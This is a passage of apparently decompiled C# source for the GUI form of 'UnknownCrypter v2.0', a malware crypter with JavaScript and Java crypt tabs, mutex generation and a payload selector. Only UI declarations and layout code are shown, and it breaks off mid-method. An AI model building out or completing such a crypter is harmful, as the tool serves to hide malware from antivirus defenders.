using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace UnknownCrypter
{
	[DesignerGenerated]
	public class Form3 : Form
	{
		public delegate void GDelegate0(string msg);

		public delegate void GDelegate1(int[] progress);

		public delegate void GDelegate2(int tabIndex);

		private static List<WeakReference> list_0 = new List<WeakReference>();

		private IContainer icontainer_0;

		[AccessedThroughProperty("BlackShadesNetForm1")]
		private GControl0 _BlackShadesNetForm1;

		[AccessedThroughProperty("RedemptionTabControl1")]
		private GControl14 _RedemptionTabControl1;

		[AccessedThroughProperty("TabPage1")]
		private TabPage _TabPage1;

		[AccessedThroughProperty("RedemptionLabel3")]
		private GControl13 _RedemptionLabel3;

		[AccessedThroughProperty("txtMutex1")]
		private GControl11 _txtMutex1;

		[AccessedThroughProperty("RedemptionLabel2")]
		private GControl13 _RedemptionLabel2;

		[AccessedThroughProperty("RedemptionLabel1")]
		private GControl13 _RedemptionLabel1;

		[AccessedThroughProperty("TabPage2")]
		private TabPage _TabPage2;

		[AccessedThroughProperty("cmbExtension1")]
		private GClass3 _cmbExtension1;

		[AccessedThroughProperty("btnBrowse1")]
		private Control14 _btnBrowse1;

		[AccessedThroughProperty("RedemptionLabel4")]
		private GControl13 _RedemptionLabel4;

		[AccessedThroughProperty("btnCryptJS")]
		private Control15 _btnCryptJS;

		[AccessedThroughProperty("btnSave1")]
		private Control14 _btnSave1;

		[AccessedThroughProperty("btnGenerateMutex1")]
		private Control14 _btnGenerateMutex1;

		[AccessedThroughProperty("chkInstallJre")]
		private Control20 _chkInstallJre;

		[AccessedThroughProperty("btnCryptJava")]
		private Control15 _btnCryptJava;

		[AccessedThroughProperty("btnSave2")]
		private Control14 _btnSave2;

		[AccessedThroughProperty("btnGenerateMutex2")]
		private Control14 _btnGenerateMutex2;

		[AccessedThroughProperty("btnBrowse2")]
		private Control14 _btnBrowse2;

		[AccessedThroughProperty("RedemptionLabel5")]
		private GControl13 _RedemptionLabel5;

		[AccessedThroughProperty("cmbExtension2")]
		private GClass3 _cmbExtension2;

		[AccessedThroughProperty("RedemptionLabel6")]
		private GControl13 _RedemptionLabel6;

		[AccessedThroughProperty("txtMutex2")]
		private GControl11 _txtMutex2;

		[AccessedThroughProperty("RedemptionLabel7")]
		private GControl13 _RedemptionLabel7;

		[AccessedThroughProperty("RedemptionLabel8")]
		private GControl13 _RedemptionLabel8;

		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog openFileDialog_0;

		[AccessedThroughProperty("SaveFileDialog1")]
		private SaveFileDialog saveFileDialog_0;

		[AccessedThroughProperty("progressBar1")]
		private GControl27 _progressBar1;

		[AccessedThroughProperty("progressBar2")]
		private GControl27 _progressBar2;

		[AccessedThroughProperty("txtFileName1")]
		private Control3 _txtFileName1;

		[AccessedThroughProperty("txtOutputFileName1")]
		private Control3 _txtOutputFileName1;

		[AccessedThroughProperty("txtOutputFileName2")]
		private Control3 _txtOutputFileName2;

		[AccessedThroughProperty("txtFileName2")]
		private Control3 _txtFileName2;

		[AccessedThroughProperty("cmbPayload")]
		private GClass3 _cmbPayload;

		[AccessedThroughProperty("RedemptionLabel9")]
		private GControl13 _RedemptionLabel9;

		public static string string_0;

		public static string string_1;

		public static string string_2;

		public static string string_3;

		public static string string_4;

		public static bool bool_0 = false;

		public static bool bool_1 = true;

		internal virtual GControl0 BlackShadesNetForm1
		{
			[DebuggerNonUserCode]
			get
			{
				return _BlackShadesNetForm1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_BlackShadesNetForm1 = value;
			}
		}

		internal virtual GControl14 RedemptionTabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionTabControl1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionTabControl1 = value;
			}
		}

		internal virtual TabPage TabPage1
		{
			[DebuggerNonUserCode]
			get
			{
				return _TabPage1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_TabPage1 = value;
			}
		}

		internal virtual GControl13 RedemptionLabel3
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel3;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel3 = value;
			}
		}

		internal virtual GControl11 txtMutex1
		{
			[DebuggerNonUserCode]
			get
			{
				return _txtMutex1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_txtMutex1 = value;
			}
		}

		internal virtual GControl13 RedemptionLabel2
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel2 = value;
			}
		}

		internal virtual GControl13 RedemptionLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel1 = value;
			}
		}

		internal virtual TabPage TabPage2
		{
			[DebuggerNonUserCode]
			get
			{
				return _TabPage2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_TabPage2 = value;
			}
		}

		internal virtual GClass3 cmbExtension1
		{
			[DebuggerNonUserCode]
			get
			{
				return _cmbExtension1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = cmbExtension1_SelectedIndexChanged;
				if (_cmbExtension1 != null)
				{
					_cmbExtension1.SelectedIndexChanged -= value2;
				}
				_cmbExtension1 = value;
				if (_cmbExtension1 != null)
				{
					_cmbExtension1.SelectedIndexChanged += value2;
				}
			}
		}

		internal virtual Control14 btnBrowse1
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnBrowse1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnBrowse1_Click;
				if (_btnBrowse1 != null)
				{
					_btnBrowse1.Click -= value2;
				}
				_btnBrowse1 = value;
				if (_btnBrowse1 != null)
				{
					_btnBrowse1.Click += value2;
				}
			}
		}

		internal virtual GControl13 RedemptionLabel4
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel4;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel4 = value;
			}
		}

		internal virtual Control15 btnCryptJS
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnCryptJS;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnCryptJS_Click;
				if (_btnCryptJS != null)
				{
					_btnCryptJS.Click -= value2;
				}
				_btnCryptJS = value;
				if (_btnCryptJS != null)
				{
					_btnCryptJS.Click += value2;
				}
			}
		}

		internal virtual Control14 btnSave1
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnSave1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnSave1_Click;
				if (_btnSave1 != null)
				{
					_btnSave1.Click -= value2;
				}
				_btnSave1 = value;
				if (_btnSave1 != null)
				{
					_btnSave1.Click += value2;
				}
			}
		}

		internal virtual Control14 btnGenerateMutex1
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnGenerateMutex1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnGenerateMutex1_Click;
				if (_btnGenerateMutex1 != null)
				{
					_btnGenerateMutex1.Click -= value2;
				}
				_btnGenerateMutex1 = value;
				if (_btnGenerateMutex1 != null)
				{
					_btnGenerateMutex1.Click += value2;
				}
			}
		}

		internal virtual Control20 chkInstallJre
		{
			[DebuggerNonUserCode]
			get
			{
				return _chkInstallJre;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_chkInstallJre = value;
			}
		}

		internal virtual Control15 btnCryptJava
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnCryptJava;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnCryptJava_Click;
				if (_btnCryptJava != null)
				{
					_btnCryptJava.Click -= value2;
				}
				_btnCryptJava = value;
				if (_btnCryptJava != null)
				{
					_btnCryptJava.Click += value2;
				}
			}
		}

		internal virtual Control14 btnSave2
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnSave2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnSave2_Click;
				if (_btnSave2 != null)
				{
					_btnSave2.Click -= value2;
				}
				_btnSave2 = value;
				if (_btnSave2 != null)
				{
					_btnSave2.Click += value2;
				}
			}
		}

		internal virtual Control14 btnGenerateMutex2
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnGenerateMutex2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnGenerateMutex2_Click;
				if (_btnGenerateMutex2 != null)
				{
					_btnGenerateMutex2.Click -= value2;
				}
				_btnGenerateMutex2 = value;
				if (_btnGenerateMutex2 != null)
				{
					_btnGenerateMutex2.Click += value2;
				}
			}
		}

		internal virtual Control14 btnBrowse2
		{
			[DebuggerNonUserCode]
			get
			{
				return _btnBrowse2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = btnBrowse2_Click;
				if (_btnBrowse2 != null)
				{
					_btnBrowse2.Click -= value2;
				}
				_btnBrowse2 = value;
				if (_btnBrowse2 != null)
				{
					_btnBrowse2.Click += value2;
				}
			}
		}

		internal virtual GControl13 RedemptionLabel5
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel5;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel5 = value;
			}
		}

		internal virtual GClass3 cmbExtension2
		{
			[DebuggerNonUserCode]
			get
			{
				return _cmbExtension2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = cmbExtension2_SelectedIndexChanged;
				if (_cmbExtension2 != null)
				{
					_cmbExtension2.SelectedIndexChanged -= value2;
				}
				_cmbExtension2 = value;
				if (_cmbExtension2 != null)
				{
					_cmbExtension2.SelectedIndexChanged += value2;
				}
			}
		}

		internal virtual GControl13 RedemptionLabel6
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel6;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel6 = value;
			}
		}

		internal virtual GControl11 txtMutex2
		{
			[DebuggerNonUserCode]
			get
			{
				return _txtMutex2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_txtMutex2 = value;
			}
		}

		internal virtual GControl13 RedemptionLabel7
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel7;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel7 = value;
			}
		}

		internal virtual GControl13 RedemptionLabel8
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel8;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel8 = value;
			}
		}

		internal virtual OpenFileDialog OpenFileDialog_0
		{
			[DebuggerNonUserCode]
			get
			{
				return openFileDialog_0;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				openFileDialog_0 = value;
			}
		}

		internal virtual SaveFileDialog SaveFileDialog_0
		{
			[DebuggerNonUserCode]
			get
			{
				return saveFileDialog_0;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				saveFileDialog_0 = value;
			}
		}

		internal virtual GControl27 progressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return _progressBar1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_progressBar1 = value;
			}
		}

		internal virtual GControl27 progressBar2
		{
			[DebuggerNonUserCode]
			get
			{
				return _progressBar2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_progressBar2 = value;
			}
		}

		internal virtual Control3 txtFileName1
		{
			[DebuggerNonUserCode]
			get
			{
				return _txtFileName1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_txtFileName1 = value;
			}
		}

		internal virtual Control3 txtOutputFileName1
		{
			[DebuggerNonUserCode]
			get
			{
				return _txtOutputFileName1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_txtOutputFileName1 = value;
			}
		}

		internal virtual Control3 txtOutputFileName2
		{
			[DebuggerNonUserCode]
			get
			{
				return _txtOutputFileName2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_txtOutputFileName2 = value;
			}
		}

		internal virtual Control3 txtFileName2
		{
			[DebuggerNonUserCode]
			get
			{
				return _txtFileName2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_txtFileName2 = value;
			}
		}

		internal virtual GClass3 cmbPayload
		{
			[DebuggerNonUserCode]
			get
			{
				return _cmbPayload;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = cmbPayload_SelectedIndexChanged;
				if (_cmbPayload != null)
				{
					_cmbPayload.SelectedIndexChanged -= value2;
				}
				_cmbPayload = value;
				if (_cmbPayload != null)
				{
					_cmbPayload.SelectedIndexChanged += value2;
				}
			}
		}

		internal virtual GControl13 RedemptionLabel9
		{
			[DebuggerNonUserCode]
			get
			{
				return _RedemptionLabel9;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_RedemptionLabel9 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form3()
		{
			base.FormClosing += Form3_FormClosing;
			base.Load += Form3_Load;
			smethod_0(this);
			InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void smethod_0(object object_0)
		{
			checked
			{
				lock (list_0)
				{
					if (list_0.Count == list_0.Capacity)
					{
						int num = 0;
						int num2 = list_0.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = list_0[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									list_0[num] = list_0[num3];
								}
								num++;
							}
							num3++;
						}
						list_0.RemoveRange(num, list_0.Count - num);
						list_0.Capacity = list_0.Count;
					}
					list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && icontainer_0 != null)
				{
					icontainer_0.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(UnknownCrypter.Form3));
			OpenFileDialog_0 = new System.Windows.Forms.OpenFileDialog();
			SaveFileDialog_0 = new System.Windows.Forms.SaveFileDialog();
			BlackShadesNetForm1 = new GControl0();
			RedemptionTabControl1 = new GControl14();
			TabPage1 = new System.Windows.Forms.TabPage();
			txtOutputFileName1 = new Control3();
			txtFileName1 = new Control3();
			progressBar1 = new GControl27();
			btnCryptJS = new Control15();
			btnSave1 = new Control14();
			btnGenerateMutex1 = new Control14();
			btnBrowse1 = new Control14();
			RedemptionLabel4 = new GControl13();
			cmbExtension1 = new GClass3();
			RedemptionLabel3 = new GControl13();
			txtMutex1 = new GControl11();
			RedemptionLabel2 = new GControl13();
			RedemptionLabel1 = new GControl13();
			TabPage2 = new System.Windows.Forms.TabPage();
			cmbPayload = new GClass3();
			RedemptionLabel9 = new GControl13();
			txtOutputFileName2 = new Control3();
			txtFileName2 = new Control3();
			progressBar2 = new GControl27();
			chkInstallJre = new Control20();
			btnCryptJava = new Control15();
			btnSave2 = new Control14();
			btnGenerateMutex2 = new Control14();
			btnBrowse2 = new Control14();
			RedemptionLabel5 = new GControl13();
			cmbExtension2 = new GClass3();
			RedemptionLabel6 = new GControl13();
			txtMutex2 = new GControl11();
			RedemptionLabel7 = new GControl13();
			RedemptionLabel8 = new GControl13();
			BlackShadesNetForm1.SuspendLayout();
			RedemptionTabControl1.SuspendLayout();
			TabPage1.SuspendLayout();
			TabPage2.SuspendLayout();
			SuspendLayout();
			OpenFileDialog_0.FileName = "OpenFileDialog1";
			BlackShadesNetForm1.Boolean_0 = false;
			BlackShadesNetForm1.Controls.Add(RedemptionTabControl1);
			BlackShadesNetForm1.Dock = System.Windows.Forms.DockStyle.Fill;
			BlackShadesNetForm1.Font = new System.Drawing.Font("Trebuchet MS", 8.25f, System.Drawing.FontStyle.Bold);
			BlackShadesNetForm1.ForeColor = System.Drawing.Color.FromArgb(142, 152, 156);
			System.Drawing.Point point2 = (BlackShadesNetForm1.Location = new System.Drawing.Point(0, 0));
			System.Windows.Forms.Padding padding2 = (BlackShadesNetForm1.Margin = new System.Windows.Forms.Padding(4));
			BlackShadesNetForm1.Boolean_1 = true;
			BlackShadesNetForm1.Name = "BlackShadesNetForm1";
			System.Drawing.Size size2 = (BlackShadesNetForm1.Size = new System.Drawing.Size(606, 394));
			BlackShadesNetForm1.TabIndex = 0;
			BlackShadesNetForm1.Text = "UnknownCrypter v2.0";
			RedemptionTabControl1.Alignment = System.Windows.Forms.TabAlignment.Left;
			RedemptionTabControl1.Controls.Add(TabPage1);
			RedemptionTabControl1.Controls.Add(TabPage2);
			RedemptionTabControl1.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			size2 = (RedemptionTabControl1.ItemSize = new System.Drawing.Size(35, 100));
			point2 = (RedemptionTabControl1.Location = new System.Drawing.Point(4, 28));
			padding2 = (RedemptionTabControl1.Margin = new System.Windows.Forms.Padding(4));
			RedemptionTabControl1.Multiline = true;
			RedemptionTabControl1.Name = "RedemptionTabControl1";
			RedemptionTabControl1.SelectedIndex = 0;
			size2 = (RedemptionTabControl1.Size = new System.Drawing.Size(598, 362));
			RedemptionTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
			RedemptionTabControl1.TabIndex = 2;
			RedemptionTabControl1.GEnum3_0 = GControl14.GEnum3.Left;
			TabPage1.BackColor = System.Drawing.Color.FromArgb(47, 48, 52);
			TabPage1.Controls.Add(txtOutputFileName1);
			TabPage1.Controls.Add(txtFileName1);
			TabPage1.Controls.Add(progressBar1);
			TabPage1.Controls.Add(btnCryptJS);
			TabPage1.Controls.Add(btnSave1);
			TabPage1.Controls.Add(btnGenerateMutex1);
			TabPage1.Controls.Add(btnBrowse1);
			TabPage1.Controls.Add(RedemptionLabel4);
			TabPage1.Controls.Add(cmbExtension1);
			TabPage1.Controls.Add(RedemptionLabel3);
			TabPage1.Controls.Add(txtMutex1);
			TabPage1.Controls.Add(RedemptionLabel2);
			TabPage1.Controls.Add(RedemptionLabel1);
			point2 = (TabPage1.Location = new System.Drawing.Point(104, 4));
			padding2 = (TabPage1.Margin = new System.Windows.Forms.Padding(4));
			TabPage1.Name = "TabPage1";
			padding2 = (TabPage1.Padding = new System.Windows.Forms.Padding(4));
			size2 = (TabPage1.Size = new System.Drawing.Size(490, 354));
			TabPage1.TabIndex = 0;
			TabPage1.Text = "Js Crypt";
			txtOutputFileName1.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtOutputFileName1.Enabled = false;
			txtOutputFileName1.Font = new System.Drawing.Font("Arial", 9f);
			txtOutputFileName1.ForeColor = System.Drawing.Color.DimGray;
			txtOutputFileName1.Image_0 = null;
			point2 = (txtOutputFileName1.Location = new System.Drawing.Point(10, 255));
			txtOutputFileName1.Int32_0 = 32767;
			txtOutputFileName1.Name = "txtOutputFileName1";
			txtOutputFileName1.Boolean_0 = false;
			size2 = (txtOutputFileName1.Size = new System.Drawing.Size(371, 30));
			txtOutputFileName1.TabIndex = 20;
			txtOutputFileName1.HorizontalAlignment_0 = System.Windows.Forms.HorizontalAlignment.Left;
			txtOutputFileName1.Boolean_1 = false;
			txtFileName1.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtFileName1.Enabled = false;
			txtFileName1.Font = new System.Drawing.Font("Arial", 9f);
			txtFileName1.ForeColor = System.Drawing.Color.DimGray;
			txtFileName1.Image_0 = null;
			point2 = (txtFileName1.Location = new System.Drawing.Point(12, 36));
			txtFileName1.Int32_0 = 32767;
			txtFileName1.Name = "txtFileName1";
			txtFileName1.Boolean_0 = true;
			size2 = (txtFileName1.Size = new System.Drawing.Size(369, 30));
			txtFileName1.TabIndex = 19;
			txtFileName1.HorizontalAlignment_0 = System.Windows.Forms.HorizontalAlignment.Left;
			txtFileName1.Boolean_1 = false;
			progressBar1.BackColor = System.Drawing.Color.Transparent;
			progressBar1.Color_3 = System.Drawing.Color.FromArgb(45, 45, 48);
			progressBar1.Color_0 = System.Drawing.Color.FromArgb(28, 28, 28);
			point2 = (progressBar1.Location = new System.Drawing.Point(331, 149));
			padding2 = (progressBar1.Margin = new System.Windows.Forms.Padding(4));
			progressBar1.Int32_0 = 100;
			progressBar1.Name = "progressBar1";
			progressBar1.Color_2 = System.Drawing.Color.FromArgb(62, 62, 66);
			progressBar1.Int32_3 = 255;
			size2 = (progressBar1.Size = new System.Drawing.Size(104, 104));
			progressBar1.Int32_2 = 110;
			progressBar1.TabIndex = 18;
			progressBar1.Color_1 = System.Drawing.Color.FromArgb(153, 153, 153);
			progressBar1.Int32_1 = 0;
			btnCryptJS.BackColor = System.Drawing.Color.Transparent;
			btnCryptJS.Struct0_0 = new Struct0[0];
			btnCryptJS.String_0 = "";
			btnCryptJS.Font = new System.Drawing.Font("Verdana", 10f, System.Drawing.FontStyle.Bold);
			btnCryptJS.Image_0 = null;
			point2 = (btnCryptJS.Location = new System.Drawing.Point(121, 293));
			padding2 = (btnCryptJS.Margin = new System.Windows.Forms.Padding(4));
			btnCryptJS.Name = "btnCryptJS";
			btnCryptJS.Boolean_0 = false;
			size2 = (btnCryptJS.Size = new System.Drawing.Size(202, 51));
			btnCryptJS.TabIndex = 16;
			btnCryptJS.Text = "CRYPT";
			btnCryptJS.Boolean_1 = true;
			btnSave1.BackColor = System.Drawing.Color.Transparent;
			btnSave1.Struct0_0 = new Struct0[0];
			btnSave1.String_0 = "";
			btnSave1.Font = new System.Drawing.Font("Verdana", 8f);
			btnSave1.Image_0 = null;
			point2 = (btnSave1.Location = new System.Drawing.Point(387, 256));
			padding2 = (btnSave1.Margin = new System.Windows.Forms.Padding(4));
			btnSave1.Name = "btnSave1";
			btnSave1.Boolean_0 = false;
			size2 = (btnSave1.Size = new System.Drawing.Size(49, 28));
			btnSave1.TabIndex = 15;
			btnSave1.Text = "...";
			btnSave1.Boolean_1 = true;
			btnGenerateMutex1.BackColor = System.Drawing.Color.Transparent;
			btnGenerateMutex1.Struct0_0 = new Struct0[0];
			btnGenerateMutex1.String_0 = "";
			btnGenerateMutex1.Font = new System.Drawing.Font("Verdana", 8f);
			btnGenerateMutex1.Image_0 = null;
			point2 = (btnGenerateMutex1.Location = new System.Drawing.Point(333, 111));
			padding2 = (btnGenerateMutex1.Margin = new System.Windows.Forms.Padding(4));
			btnGenerateMutex1.Name = "btnGenerateMutex1";
			btnGenerateMutex1.Boolean_0 = false;
			size2 = (btnGenerateMutex1.Size = new System.Drawing.Size(103, 28));
			btnGenerateMutex1.TabIndex = 14;
			btnGenerateMutex1.Text = "Generate";
			btnGenerateMutex1.Boolean_1 = true;
			btnBrowse1.BackColor = System.Drawing.Color.Transparent;
			btnBrowse1.Struct0_0 = new Struct0[0];
			btnBrowse1.String_0 = "";
			btnBrowse1.Font = new System.Drawing.Font("Verdana", 8f);
			btnBrowse1.Image_0 = null;
			point2 = (btnBrowse1.Location = new System.Drawing.Point(388, 38));
			padding2 = (btnBrowse1.Margin = new System.Windows.Forms.Padding(4));
			btnBrowse1.Name = "btnBrowse1";
			btnBrowse1.Boolean_0 = false;
			size2 = (btnBrowse1.Size = new System.Drawing.Size(49, 28));
			btnBrowse1.TabIndex = 13;
			btnBrowse1.Text = "...";
			btnBrowse1.Boolean_1 = true;
			RedemptionLabel4.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel4.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel4.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel4.Location = new System.Drawing.Point(11, 219));
			padding2 = (RedemptionLabel4.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel4.Name = "RedemptionLabel4";
			size2 = (RedemptionLabel4.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel4.TabIndex = 11;
			RedemptionLabel4.Text = "Save File";
			cmbExtension1.BackColor = System.Drawing.Color.Transparent;
			cmbExtension1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			cmbExtension1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			cmbExtension1.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			cmbExtension1.ForeColor = System.Drawing.Color.FromArgb(182, 179, 171);
			cmbExtension1.FormattingEnabled = true;
			cmbExtension1.ItemHeight = 18;
			cmbExtension1.Items.AddRange(new object[1] { "JavaScript File (*.js)" });
			point2 = (cmbExtension1.Location = new System.Drawing.Point(8, 182));
			padding2 = (cmbExtension1.Margin = new System.Windows.Forms.Padding(4));
			cmbExtension1.Name = "cmbExtension1";
			size2 = (cmbExtension1.Size = new System.Drawing.Size(315, 24));
			cmbExtension1.TabIndex = 10;
			RedemptionLabel3.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel3.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel3.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel3.Location = new System.Drawing.Point(8, 146));
			padding2 = (RedemptionLabel3.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel3.Name = "RedemptionLabel3";
			size2 = (RedemptionLabel3.Size = new System.Drawing.Size(157, 28));
			RedemptionLabel3.TabIndex = 8;
			RedemptionLabel3.Text = "Output Extension";
			txtMutex1.BackColor = System.Drawing.Color.Transparent;
			txtMutex1.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			txtMutex1.ForeColor = System.Drawing.Color.White;
			point2 = (txtMutex1.Location = new System.Drawing.Point(8, 110));
			padding2 = (txtMutex1.Margin = new System.Windows.Forms.Padding(4));
			txtMutex1.Int32_0 = 32767;
			txtMutex1.Boolean_1 = false;
			txtMutex1.Name = "txtMutex1";
			size2 = (txtMutex1.Size = new System.Drawing.Size(317, 30));
			txtMutex1.TabIndex = 5;
			txtMutex1.HorizontalAlignment_0 = System.Windows.Forms.HorizontalAlignment.Left;
			txtMutex1.Boolean_0 = false;
			RedemptionLabel2.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel2.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel2.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel2.Location = new System.Drawing.Point(8, 74));
			padding2 = (RedemptionLabel2.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel2.Name = "RedemptionLabel2";
			size2 = (RedemptionLabel2.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel2.TabIndex = 4;
			RedemptionLabel2.Text = "Mutex";
			RedemptionLabel1.BackColor = System.Drawing.Color.Transparent;
			RedemptionLabel1.Font = new System.Drawing.Font("Arial", 8.25f, System.Drawing.FontStyle.Bold);
			RedemptionLabel1.ForeColor = System.Drawing.Color.White;
			point2 = (RedemptionLabel1.Location = new System.Drawing.Point(11, 6));
			padding2 = (RedemptionLabel1.Margin = new System.Windows.Forms.Padding(4));
			RedemptionLabel1.Name = "RedemptionLabel1";
			size2 = (RedemptionLabel1.Size = new System.Drawing.Size(100, 28));
			RedemptionLabel1.TabIndex = 3;
			RedemptionLabel1.Text = "Select File";
			TabPage2.BackColor = System.Drawing.Color.FromArgb(47, 48, 52);
			TabPage2.Controls.Add(cmbPayload);
			TabPage2.Controls.Add(RedemptionLabel9);
			TabPage2.Controls.Add(txtOutputFileName2);
			TabPage2.Controls.Add(txtFileName2);
			TabPage2.Controls.Add(progressBar2);
			TabPage2.Controls.Add(chkInstallJre);
			TabPage2.Controls.Add(btnCryptJava);
			TabPage2.Controls.Add(btnSave2);
			TabPage2.Controls.Add(btnGenerateMutex2);
			TabPage2.Controls.Add(btnBrowse2);
			TabPage2.Controls.Add(RedemptionLabel5);
			TabPage2.Controls.Add(cmbExtension2);
			TabPage2.Controls.Add(RedemptionLabel6);
			TabPage2.Controls.Add(txtMutex2);
			TabPage2.Controls.Add(RedemptionLabel7);
